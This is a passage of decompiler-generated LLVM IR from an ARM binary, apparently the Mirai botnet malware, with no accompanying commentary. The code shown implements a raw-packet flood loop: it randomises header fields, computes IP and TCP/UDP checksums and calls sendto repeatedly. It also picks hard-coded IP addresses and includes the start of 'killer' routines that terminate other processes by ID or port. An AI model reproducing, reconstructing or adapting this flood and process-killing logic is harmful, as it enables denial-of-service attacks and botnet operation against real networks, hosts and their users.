  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c6c4, label %dec_label_pc_c6c0, label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c6c0, %dec_label_pc_c7b8
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_c6d4 = load i32, i32* @r7, align 4
  %v1_c6d4 = add i32 %v0_c6d4, 27
  store i32 %v1_c6d4, i32* @sb, align 4
  %v1_c6d8 = add i32 %v0_c6d4, 47
  store i32 %v1_c6d8, i32* @sl, align 4
  br label %dec_label_pc_c6dc

dec_label_pc_c6dc:                                ; preds = %dec_label_pc_c720, %dec_label_pc_c6d0
  %v1_c6e8 = phi i32 [ %v1_c7a8, %dec_label_pc_c720 ], [ 0, %dec_label_pc_c6d0 ]
  store i32 %v2_c1ec, i32* %r3.global-to-local, align 4
  store i32 %v3_c494, i32* %ip.global-to-local, align 4
  %v4_c6e8 = mul i32 %v1_c6e8, 4
  %v5_c6e8 = add i32 %v4_c6e8, %v2_c1ec
  %v6_c6e8 = inttoptr i32 %v5_c6e8 to i32*
  %v7_c6e8 = load i32, i32* %v6_c6e8, align 4
  store i32 %v7_c6e8, i32* @r4, align 4
  store i32 65535, i32* @r5, align 4
  store i1 %v3_c6f0, i1* %cpsr_z.global-to-local, align 1
  %v1_c6f4 = add i32 %v7_c6e8, 20
  store i32 %v1_c6f4, i32* @r6, align 4
  br i1 %v3_c6f0, label %dec_label_pc_c7cc, label %dec_label_pc_c6fc

dec_label_pc_c6fc:                                ; preds = %dec_label_pc_c6dc
  store i32 %v3_c49c, i32* @lr, align 4
  store i1 %v3_c700, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c700, label %dec_label_pc_c7e0, label %dec_label_pc_c708

dec_label_pc_c708:                                ; preds = %dec_label_pc_c7cc.dec_label_pc_c708_crit_edge, %dec_label_pc_c6fc
  %v1_c70c = phi i32 [ %v1_c70c.pre, %dec_label_pc_c7cc.dec_label_pc_c708_crit_edge ], [ 65535, %dec_label_pc_c6fc ]
  store i32 %v3_c4b8, i32* %r0.global-to-local, align 4
  %v9_c70c = icmp eq i32 %v3_c4b8, %v1_c70c
  store i1 %v9_c70c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c70c, label %dec_label_pc_c7f4, label %dec_label_pc_c714

dec_label_pc_c714:                                ; preds = %dec_label_pc_c7e0, %dec_label_pc_c708
  %v1_c718 = phi i32 [ %v1_c7ec, %dec_label_pc_c7e0 ], [ %v1_c70c, %dec_label_pc_c708 ]
  store i32 %v3_c4c0, i32* %r2.global-to-local, align 4
  %v9_c718 = icmp eq i32 %v3_c4c0, %v1_c718
  store i1 %v9_c718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c718, label %dec_label_pc_c808, label %dec_label_pc_c720

dec_label_pc_c720:                                ; preds = %dec_label_pc_c7f4, %dec_label_pc_c714, %dec_label_pc_c808
  %v0_c720 = load i32, i32* @r4, align 4
  %v1_c720 = add i32 %v0_c720, 41
  store i32 %v1_c720, i32* %r0.global-to-local, align 4
  store i32 %v4_c724.pre-phi, i32* %r1.global-to-local, align 4
  %v2_c728 = call i32 @rand_alpha_str(i32 %v1_c720, i32 %v4_c724.pre-phi)
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c730 = load i32, i32* @r4, align 4
  %v3_c730 = add i32 %v2_c730, 10
  %v4_c730 = inttoptr i32 %v3_c730 to i16*
  store i16 0, i16* %v4_c730, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c738 = load i32, i32* @r4, align 4
  store i32 %v0_c738, i32* @r0, align 4
  %v2_c73c = call i32 @checksum_generic(i32 %v0_c738, i32 20)
  %v3_c73c = trunc i32 %v2_c73c to i16
  store i32 %v2_c73c, i32* %r0.global-to-local, align 4
  %v3_c740 = load i32, i32* @r4, align 4
  %v4_c740 = add i32 %v3_c740, 10
  %v5_c740 = inttoptr i32 %v4_c740 to i16*
  store i16 %v3_c73c, i16* %v5_c740, align 2
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_c748 = load i32, i32* @r6, align 4
  %v3_c748 = add i32 %v2_c748, 6
  %v4_c748 = inttoptr i32 %v3_c748 to i16*
  store i16 0, i16* %v4_c748, align 2
  %v0_c74c = load i32, i32* @r6, align 4
  store i32 %v0_c74c, i32* @r1, align 4
  %v1_c750 = add i32 %v0_c74c, 4
  %v2_c750 = inttoptr i32 %v1_c750 to i16*
  %v3_c750 = load i16, i16* %v2_c750, align 2
  %v4_c750 = zext i16 %v3_c750 to i32
  store i32 %v4_c750, i32* %r2.global-to-local, align 4
  %v0_c754 = load i32, i32* @sb, align 4
  store i32 %v0_c754, i32* %r3.global-to-local, align 4
  %v0_c758 = load i32, i32* @r4, align 4
  store i32 %v0_c758, i32* %r0.global-to-local, align 4
  %v4_c75c = call i32 @checksum_tcpudp(i32 %v0_c758, i32 %v0_c74c, i32 %v4_c750, i32 %v0_c754)
  %v5_c75c = trunc i32 %v4_c75c to i16
  store i32 %v4_c75c, i32* %r0.global-to-local, align 4
  %v3_c760 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c760, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v3_c768 = mul i32 %v3_c760, 32
  store i32 %v3_c768, i32* %ip.global-to-local, align 4
  %v3_c76c = load i32, i32* @r6, align 4
  %v4_c76c = add i32 %v3_c76c, 6
  %v5_c76c = inttoptr i32 %v4_c76c to i16*
  store i16 %v5_c75c, i16* %v5_c76c, align 2
  %v0_c770 = load i32, i32* %ip.global-to-local, align 4
  %v1_c770 = load i32, i32* %r3.global-to-local, align 4
  %tmp133 = mul i32 %v1_c770, -8
  %v5_c770 = add i32 %v0_c770, %tmp133
  store i32 %v5_c770, i32* %ip.global-to-local, align 4
  %v0_c774 = load i32, i32* @r6, align 4
  %v1_c774 = add i32 %v0_c774, 2
  %v2_c774 = inttoptr i32 %v1_c774 to i16*
  %v3_c774 = load i16, i16* %v2_c774, align 2
  %v4_c774 = zext i16 %v3_c774 to i32
  store i32 %v4_c774, i32* @r6, align 4
  %v1_c778 = load i32, i32* @lr, align 4
  %v2_c778 = add i32 %v1_c778, %v5_c770
  store i32 %v2_c778, i32* %ip.global-to-local, align 4
  %v3_c77c = add i32 %v2_c778, 2
  %v4_c77c = inttoptr i32 %v3_c77c to i16*
  store i16 %v3_c774, i16* %v4_c77c, align 2
  %v0_c780 = load i32, i32* @fp, align 4
  %v1_c780 = load i32, i32* %ip.global-to-local, align 4
  %v2_c780 = add i32 %v1_c780, 4
  %v3_c780 = inttoptr i32 %v2_c780 to i32*
  store i32 %v0_c780, i32* %v3_c780, align 4
  %v0_c784 = load i32, i32* @r4, align 4
  store i32 %v0_c784, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_c438, i32* %r0.global-to-local, align 4
  %v0_c790 = load i32, i32* @sl, align 4
  store i32 %v0_c790, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_c798 = load i32, i32* %ip.global-to-local, align 4
  %v6_c7a0 = call i32 @__libc_sendto(i32 %v3_c438, i32 %v0_c784, i32 %v0_c790, i32 16384, i32 %v0_c798, i32 16)
  %v3_c7a4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c7a4, i32* %r3.global-to-local, align 4
  %v1_c7a8 = add i32 %v3_c7a4, 1
  store i32 %v1_c7a8, i32* %r0.global-to-local, align 4
  %v0_c7ac = load i32, i32* @r8, align 4
  %v9_c7ac = icmp eq i32 %v0_c7ac, %v1_c7a8
  store i1 %v9_c7ac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c7a8, i32* %stack_var_-44, align 4
  %v8_c7b4 = icmp sgt i32 %v0_c7ac, %v1_c7a8
  br i1 %v8_c7b4, label %dec_label_pc_c6dc, label %dec_label_pc_c7b8

dec_label_pc_c7b8:                                ; preds = %dec_label_pc_c720
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c7bc = icmp eq i32 %v0_c7ac, 0
  store i1 %v2_c7bc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c7bc, label %dec_label_pc_c6c0, label %dec_label_pc_c6d0

dec_label_pc_c7cc:                                ; preds = %dec_label_pc_c6dc
  %v0_c7cc = call i32 @rand_next()
  %v1_c7cc = trunc i32 %v0_c7cc to i16
  store i32 %v0_c7cc, i32* %r0.global-to-local, align 4
  store i32 %v3_c49c, i32* @lr, align 4
  %v1_c7d4 = load i32, i32* @r5, align 4
  %v9_c7d4 = icmp eq i32 %v3_c49c, %v1_c7d4
  store i1 %v9_c7d4, i1* %cpsr_z.global-to-local, align 1
  %v3_c7d8 = load i32, i32* @r4, align 4
  %v4_c7d8 = add i32 %v3_c7d8, 4
  %v5_c7d8 = inttoptr i32 %v4_c7d8 to i16*
  store i16 %v1_c7cc, i16* %v5_c7d8, align 2
  br i1 %v9_c7d4, label %dec_label_pc_c7e0, label %dec_label_pc_c7cc.dec_label_pc_c708_crit_edge

dec_label_pc_c7cc.dec_label_pc_c708_crit_edge:    ; preds = %dec_label_pc_c7cc
  %v1_c70c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_c708

dec_label_pc_c7e0:                                ; preds = %dec_label_pc_c7cc, %dec_label_pc_c6fc
  %v0_c7e0 = call i32 @rand_next()
  %v1_c7e0 = trunc i32 %v0_c7e0 to i16
  %v3_c7e4 = load i32, i32* @r4, align 4
  %v4_c7e4 = add i32 %v3_c7e4, 20
  %v5_c7e4 = inttoptr i32 %v4_c7e4 to i16*
  store i16 %v1_c7e0, i16* %v5_c7e4, align 2
  store i32 %v3_c4b8, i32* %r0.global-to-local, align 4
  %v1_c7ec = load i32, i32* @r5, align 4
  %v9_c7ec = icmp eq i32 %v3_c4b8, %v1_c7ec
  store i1 %v9_c7ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7ec, label %dec_label_pc_c7f4, label %dec_label_pc_c714

dec_label_pc_c7f4:                                ; preds = %dec_label_pc_c7e0, %dec_label_pc_c708
  %v0_c7f4 = call i32 @rand_next()
  %v1_c7f4 = trunc i32 %v0_c7f4 to i16
  store i32 %v0_c7f4, i32* %r0.global-to-local, align 4
  store i32 %v3_c4c0, i32* %r2.global-to-local, align 4
  %v1_c7fc = load i32, i32* @r5, align 4
  %v9_c7fc = icmp eq i32 %v3_c4c0, %v1_c7fc
  store i1 %v9_c7fc, i1* %cpsr_z.global-to-local, align 1
  %v3_c800 = load i32, i32* @r6, align 4
  %v4_c800 = add i32 %v3_c800, 2
  %v5_c800 = inttoptr i32 %v4_c800 to i16*
  store i16 %v1_c7f4, i16* %v5_c800, align 2
  br i1 %v9_c7fc, label %dec_label_pc_c808, label %dec_label_pc_c720

dec_label_pc_c808:                                ; preds = %dec_label_pc_c7f4, %dec_label_pc_c714
  %v0_c808 = call i32 @rand_next()
  %v1_c808 = trunc i32 %v0_c808 to i16
  store i32 %v0_c808, i32* %r0.global-to-local, align 4
  %v3_c80c = load i32, i32* @r4, align 4
  %v4_c80c = add i32 %v3_c80c, 28
  %v5_c80c = inttoptr i32 %v4_c80c to i16*
  store i16 %v1_c808, i16* %v5_c80c, align 2
  br label %dec_label_pc_c720

dec_label_pc_c814:                                ; preds = %dec_label_pc_c39c, %dec_label_pc_c37c, %dec_label_pc_c320, %entry
  %v0_c814 = call i32 @rand_next()
  %v1_c818 = urem i32 %v0_c814, 4
  store i32 %v1_c818, i32* %r0.global-to-local, align 4
  %v2_c81c = icmp eq i32 %v1_c818, 3
  store i1 %v2_c81c, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_c814 to i2
  switch i2 %trunc, label %dec_label_pc_c4189 [
    i2 0, label %dec_label_pc_c874
    i2 1, label %dec_label_pc_c86c
    i2 -2, label %dec_label_pc_c860
    i2 -1, label %dec_label_pc_c850
  ]

dec_label_pc_c838:                                ; preds = %dec_label_pc_c448
  store i32 %v3_c438, i32* %r0.global-to-local, align 4
  %v1_c83c = call i32 @__GI___libc_close(i32 %v3_c438)
  store i32 %v1_c83c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c840

dec_label_pc_c840:                                ; preds = %dec_label_pc_c420, %dec_label_pc_c418, %dec_label_pc_c838
  %v1_c84c = phi i32 [ %v3_c438, %dec_label_pc_c420 ], [ %v1_c84c50, %dec_label_pc_c418 ], [ %v1_c83c, %dec_label_pc_c838 ]
  store i32 %v18_c1cc, i32* %sb.global-to-local, align 4
  store i32 %v27_c1cc, i32* %lr.global-to-local, align 4
  ret i32 %v1_c84c

dec_label_pc_c850:                                ; preds = %dec_label_pc_c814
  store i32 33686020, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c860:                                ; preds = %dec_label_pc_c814
  store i32 104859200, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c86c:                                ; preds = %dec_label_pc_c814
  store i32 707416650, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c874:                                ; preds = %dec_label_pc_c814
  store i32 134744072, i32* @fp, align 4
  br label %dec_label_pc_c418

; uselistorder directives
  uselistorder i32 %v1_c818, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_c814, { 1, 0 }
  uselistorder i32 %v0_c808, { 1, 0 }
  uselistorder i32 %v0_c7f4, { 1, 0 }
  uselistorder i32 %v1_c7ec, { 1, 0 }
  uselistorder i32 %v0_c7cc, { 1, 0 }
  uselistorder i32 %v1_c7a8, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c770, { 1, 0 }
  uselistorder i32 %v4_c75c, { 1, 0 }
  uselistorder i32 %v2_c73c, { 1, 0 }
  uselistorder i1 %v3_c700, { 1, 0 }
  uselistorder i1 %v3_c6f0, { 1, 0 }
  uselistorder i32 %v4_c724.pre-phi, { 1, 0 }
  uselistorder i32 %v1_c698, { 1, 0, 2 }
  uselistorder i32 %v0_c688, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v0_c674, { 2, 0, 3, 1 }
  uselistorder i32 %v0_c670, { 1, 0, 2 }
  uselistorder i32 %v0_c5e0, { 1, 0 }
  uselistorder i32 %v4_c5dc, { 2, 0, 3, 4, 1 }
  uselistorder i32 %tmp112, { 1, 0 }
  uselistorder i32 %v3_c528, { 1, 0 }
  uselistorder i32 %v3_c4e4, { 1, 0 }
  uselistorder i32 %v1_c4d8, { 2, 0, 1 }
  uselistorder i32 %v3_c4a4, { 1, 0 }
  uselistorder i32 %v3_c49c, { 1, 2, 3, 5, 0, 4 }
  uselistorder i32 %v3_c494, { 0, 2, 1 }
  uselistorder i8 %v5_c48c, { 1, 0, 2 }
  uselistorder i32 %v1_c478, { 1, 0 }
  uselistorder i32 %v0_c478, { 1, 0 }
  uselistorder i1 %v7_c468, { 1, 0 }
  uselistorder i1 %v7_c43c, { 1, 0 }
  uselistorder i32 %v3_c438, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v0_c418, { 1, 0, 2 }
  uselistorder i32 %v2_c3e8, { 0, 1, 3, 2 }
  uselistorder i32 %v2_c3e4, { 1, 0, 2 }
  uselistorder i1 %v7_c3d0, { 1, 0 }
  uselistorder i32 %v1_c3cc, { 1, 0, 2 }
  uselistorder i1 %v8_c3c4, { 1, 0 }
  uselistorder i1 %v7_c3c0, { 1, 0 }
  uselistorder i32 %v1_c3b4, { 1, 0 }
  uselistorder i8 %v2_c3a8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_c3ac, { 1, 0 }
  uselistorder i32 %v0_c3cc, { 3, 0, 2, 1 }
  uselistorder i32 %v0_c39c, { 0, 2, 1 }
  uselistorder i32 %v1_c3b0, { 0, 2, 1 }
  uselistorder i32 %v2_c384, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c37c, { 1, 0, 2, 3 }
  uselistorder i1 %v7_c374, { 1, 0 }
  uselistorder i32 %v0_c374, { 2, 3, 4, 1, 6, 5, 0 }
  uselistorder i32 %v0_c318, { 1, 0, 3, 2 }
  uselistorder i32 %v6_c2b8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_c29c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_c284, { 2, 1, 0, 3 }
  uselistorder i32 %v1_c26c, { 1, 2, 0 }
  uselistorder i32 %v5_c260, { 0, 2, 1 }
  uselistorder i32 %v7_c228, { 1, 0, 2, 3 }
  uselistorder i32 %v5_c228, { 0, 2, 1 }
  uselistorder i32 %v2_c1ec, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 34, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 40, 4, 41, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 34, 33, 35, 37, 36, 39, 38, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 6, 5, 8, 7, 9, 11, 10, 12, 13, 14, 16, 15, 18, 17, 19, 20, 21, 26, 22, 23, 24, 25, 30, 27, 28, 29, 31, 33, 32, 34, 35, 36, 37, 39, 38, 40, 41, 43, 42, 44, 46, 45, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 26, 27, 28, 25, 22, 29, 30, 31 }
  uselistorder i16 64, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 41, { 2, 3, 4, 0, 1 }
  uselistorder i32 (i32, i32*, i32, i32, i32)* @attack_get_opt_int, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 103, 104, 105, 106, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 99, 100, 101, 102, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c840, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c720, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c6d0, { 1, 0 }
  uselistorder label %dec_label_pc_c6c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c6c0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_c690, { 1, 0 }
  uselistorder label %.thread18, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %dec_label_pc_c3e0, { 1, 0 }
  uselistorder label %dec_label_pc_c3d0, { 1, 0 }
  uselistorder label %dec_label_pc_c39c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c394, { 1, 0 }
}

define i32 @checksum_generic(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_c8b0, label %dec_label_pc_c898

dec_label_pc_c898:                                ; preds = %entry
  %v0_c8a0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c89c

dec_label_pc_c89c:                                ; preds = %dec_label_pc_c89c, %dec_label_pc_c898
  %v0_c8a8 = phi i32 [ %v2_c8a8, %dec_label_pc_c89c ], [ 0, %dec_label_pc_c898 ]
  %v0_c8a0 = phi i32 [ %v5_c8a0, %dec_label_pc_c89c ], [ %v0_c8a0.pre, %dec_label_pc_c898 ]
  %v0_c89c = phi i32 [ %v1_c89c, %dec_label_pc_c89c ], [ %arg1, %dec_label_pc_c898 ]
  %v1_c89c = add i32 %v0_c89c, -2
  %v1_c8a0 = inttoptr i32 %v0_c8a0 to i16*
  %v2_c8a0 = load i16, i16* %v1_c8a0, align 2
  %v3_c8a0 = zext i16 %v2_c8a0 to i32
  %v5_c8a0 = add i32 %v0_c8a0, -2
  store i32 %v5_c8a0, i32* @r0, align 4
  %v2_c8a8 = add i32 %v3_c8a0, %v0_c8a8
  %v1_c89c.cmp = icmp ugt i32 %v1_c89c, 1
  br i1 %v1_c89c.cmp, label %dec_label_pc_c89c, label %dec_label_pc_c8b0.loopexit

dec_label_pc_c8b0.loopexit:                       ; preds = %dec_label_pc_c89c
  br label %dec_label_pc_c8b0

dec_label_pc_c8b0:                                ; preds = %entry, %dec_label_pc_c8b0.loopexit
  %v1_c8b8 = phi i32 [ %v2_c8a8, %dec_label_pc_c8b0.loopexit ], [ 0, %entry ]
  %v0_c8b0 = phi i32 [ %v1_c89c, %dec_label_pc_c8b0.loopexit ], [ %arg1, %entry ]
  %v7_c8b0 = icmp eq i32 %v0_c8b0, 1
  br i1 %v7_c8b0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c8b0
  %v1_c8b4 = load i32, i32* @r0, align 4
  %v2_c8b4 = inttoptr i32 %v1_c8b4 to i8*
  %v3_c8b4 = load i8, i8* %v2_c8b4, align 1
  %v4_c8b4 = zext i8 %v3_c8b4 to i32
  %v3_c8b8 = add i32 %v1_c8b8, %v4_c8b4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c8b0, %bb
  %v0_c8bc = phi i32 [ %v1_c8b8, %dec_label_pc_c8b0 ], [ %v3_c8b8, %bb ]
  %v3_c8c0 = urem i32 %v0_c8bc, 65536
  %v4_c8c4 = udiv i32 %v0_c8bc, 65536
  %v5_c8c4 = add nuw nsw i32 %v4_c8c4, %v3_c8c0
  %v4_c8c8 = udiv i32 %v5_c8c4, 65536
  %v5_c8c8 = add nuw nsw i32 %v4_c8c8, %v5_c8c4
  %v1_c8cc = urem i32 %v5_c8c8, 65536
  %v3_c8d4 = xor i32 %v1_c8cc, 65535
  ret i32 %v3_c8d4

; uselistorder directives
  uselistorder i32 %v5_c8c4, { 1, 0 }
  uselistorder i32 %v5_c8a0, { 1, 0 }
  uselistorder i32 %v1_c89c, { 1, 0, 2 }
  uselistorder i32 %v0_c8a0, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_c8b0, { 1, 0 }
}

define i32 @checksum_tcpudp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_c8ec = add i32 %arg1, 12
  %v2_c8ec = inttoptr i32 %v1_c8ec to i32*
  %v3_c8ec = load i32, i32* %v2_c8ec, align 4
  %v1_c8f0 = add i32 %arg1, 16
  %v2_c8f0 = inttoptr i32 %v1_c8f0 to i32*
  %v3_c8f0 = load i32, i32* %v2_c8f0, align 4
  %v7_c8f4 = icmp sgt i32 %arg3, 1
  br i1 %v7_c8f4, label %dec_label_pc_c900.preheader, label %dec_label_pc_c914

dec_label_pc_c900.preheader:                      ; preds = %entry
  %v0_c904.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_c900

dec_label_pc_c900:                                ; preds = %dec_label_pc_c900.preheader, %dec_label_pc_c900
  %v0_c90c = phi i32 [ 0, %dec_label_pc_c900.preheader ], [ %v2_c90c, %dec_label_pc_c900 ]
  %v0_c904 = phi i32 [ %v0_c904.pre, %dec_label_pc_c900.preheader ], [ %v5_c904, %dec_label_pc_c900 ]
  %v0_c900 = phi i32 [ %arg3, %dec_label_pc_c900.preheader ], [ %v1_c900, %dec_label_pc_c900 ]
  %v1_c900 = add nsw i32 %v0_c900, -2
  %v1_c904 = inttoptr i32 %v0_c904 to i16*
  %v2_c904 = load i16, i16* %v1_c904, align 2
  %v3_c904 = zext i16 %v2_c904 to i32
  %v5_c904 = add i32 %v0_c904, -2
  store i32 %v5_c904, i32* @r1, align 4
  %v2_c90c = add i32 %v3_c904, %v0_c90c
  %v8_c910 = icmp sgt i32 %v1_c900, 1
  br i1 %v8_c910, label %dec_label_pc_c900, label %dec_label_pc_c914.loopexit

dec_label_pc_c914.loopexit:                       ; preds = %dec_label_pc_c900
  br label %dec_label_pc_c914

dec_label_pc_c914:                                ; preds = %dec_label_pc_c914.loopexit, %entry
  %v1_c920 = phi i32 [ %v2_c90c, %dec_label_pc_c914.loopexit ], [ 0, %entry ]
  %v0_c914 = phi i32 [ %v1_c900, %dec_label_pc_c914.loopexit ], [ %arg3, %entry ]
  %v7_c914 = icmp eq i32 %v0_c914, 1
  br i1 %v7_c914, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_c914
  br label %bb19

bb:                                               ; preds = %dec_label_pc_c914
  %v1_c918 = load i32, i32* @r1, align 4
  %v2_c918 = inttoptr i32 %v1_c918 to i8*
  %v3_c918 = load i8, i8* %v2_c918, align 1
  %v4_c918 = zext i8 %v3_c918 to i32
  %v3_c920 = add i32 %v4_c918, %v1_c920
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_c948 = phi i32 [ %v1_c920, %.thread ], [ %v3_c920, %bb ]
  %v0_c928 = mul i32 %v3_c8ec, 65536
  %v3_c928 = udiv i32 %v0_c928, 65536
  %v3_c92c = urem i32 %v3_c8f0, 65536
  %v4_c934 = udiv i32 %v3_c8ec, 65536
  %v2_c930 = add nuw nsw i32 %v3_c92c, %v4_c934
  %v5_c934 = add nuw nsw i32 %v2_c930, %v3_c928
  %v1_c938 = add i32 %arg1, 9
  %v2_c938 = inttoptr i32 %v1_c938 to i8*
  %v3_c938 = load i8, i8* %v2_c938, align 1
  %v4_c938 = zext i8 %v3_c938 to i32
  %v4_c93c = udiv i32 %v3_c8f0, 65536
  %v3_c944 = mul nuw nsw i32 %v4_c938, 256
  %v5_c93c = add i32 %v4_c93c, %arg2
  %v2_c940 = add i32 %v5_c93c, %v1_c948
  %v2_c948 = add i32 %v2_c940, %v5_c934
  %v2_c94c = add i32 %v2_c948, %v3_c944
  %tmp = icmp ult i32 %v2_c94c, 65536
  br i1 %tmp, label %dec_label_pc_c96c, label %dec_label_pc_c958

dec_label_pc_c958:                                ; preds = %bb19, %dec_label_pc_c958
  %v2_c9605 = phi i32 [ %v2_c960, %dec_label_pc_c958 ], [ %v2_c94c, %bb19 ]
  %v3_c9646.in = phi i32 [ %v2_c960, %dec_label_pc_c958 ], [ %v2_c94c, %bb19 ]
  %v3_c9646 = udiv i32 %v3_c9646.in, 65536
  %v3_c95c = urem i32 %v2_c9605, 65536
  %v2_c960 = add nuw nsw i32 %v3_c95c, %v3_c9646
  %tmp20 = icmp ult i32 %v2_c960, 65536
  br i1 %tmp20, label %dec_label_pc_c96c.loopexit, label %dec_label_pc_c958

dec_label_pc_c96c.loopexit:                       ; preds = %dec_label_pc_c958
  br label %dec_label_pc_c96c

dec_label_pc_c96c:                                ; preds = %dec_label_pc_c96c.loopexit, %bb19
  %v0_c96c = phi i32 [ %v2_c960, %dec_label_pc_c96c.loopexit ], [ %v2_c94c, %bb19 ]
  %v1_c96c = urem i32 %v0_c96c, 65536
  %v3_c974 = xor i32 %v1_c96c, 65535
  ret i32 %v3_c974

; uselistorder directives
  uselistorder i32 %v2_c960, { 2, 1, 3, 0 }
  uselistorder i32 %v2_c94c, { 3, 0, 2, 1 }
  uselistorder i32 %v1_c920, { 1, 0 }
  uselistorder i32 %v5_c904, { 1, 0 }
  uselistorder i32 %v0_c904, { 1, 0 }
  uselistorder i32 %v3_c8ec, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c958, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_c900, { 1, 0 }
}

define i32 @killer_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v2_c98c = load i32, i32* @global_var_24724.70, align 4
  %v2_c994 = call i32 @kill(i32 %v2_c98c, i32 9)
  ret i32 %v2_c994
}

define i32 @killer_kill_by_port(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-585 = alloca i8, align 1
  %v3_c9a8 = load i32, i32* @r4, align 4
  %v6_c9a8 = load i32, i32* @r5, align 4
  %v9_c9a8 = load i32, i32* @r6, align 4
  %v12_c9a8 = load i32, i32* @r7, align 4
  %v15_c9a8 = load i32, i32* @r8, align 4
  %v18_c9a8 = load i32, i32* @sb, align 4
  %v21_c9a8 = load i32, i32* @sl, align 4
  %v24_c9a8 = load i32, i32* @fp, align 4
